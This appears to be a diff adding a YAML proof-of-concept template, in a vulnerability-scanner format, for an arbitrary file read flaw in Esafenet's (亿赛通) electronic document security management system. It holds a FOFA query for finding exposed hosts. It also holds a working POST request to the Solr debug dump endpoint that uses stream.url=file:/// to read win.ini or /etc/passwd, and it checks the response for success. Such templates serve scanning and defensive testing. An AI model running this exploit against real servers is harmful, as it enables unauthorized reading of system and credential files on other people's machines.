@@ -1,0 +1,22 @@
+id: poc-yaml-yisaitong-esafenet-dump-anyfile-read
+info:
+  name: 亿赛通电子文档安全管理系统 dump 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  file: 'c:/windows/win.ini
+
+    /etc/passwd'
+requests:
+- method: POST
+  path: /solr/flow/debug/dump?param=ContentStreams
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: stream.url=file:///{{.file}}
+  expression: status_code == 200 && ( (contains(body,"[extensions]") && contains(body,"[files]")
+    && contains(headers,"application/xml")) || (contains(body,"root:") && contains(body,"/bin")
+    && contains(headers,"application/json")) )
+transport: http
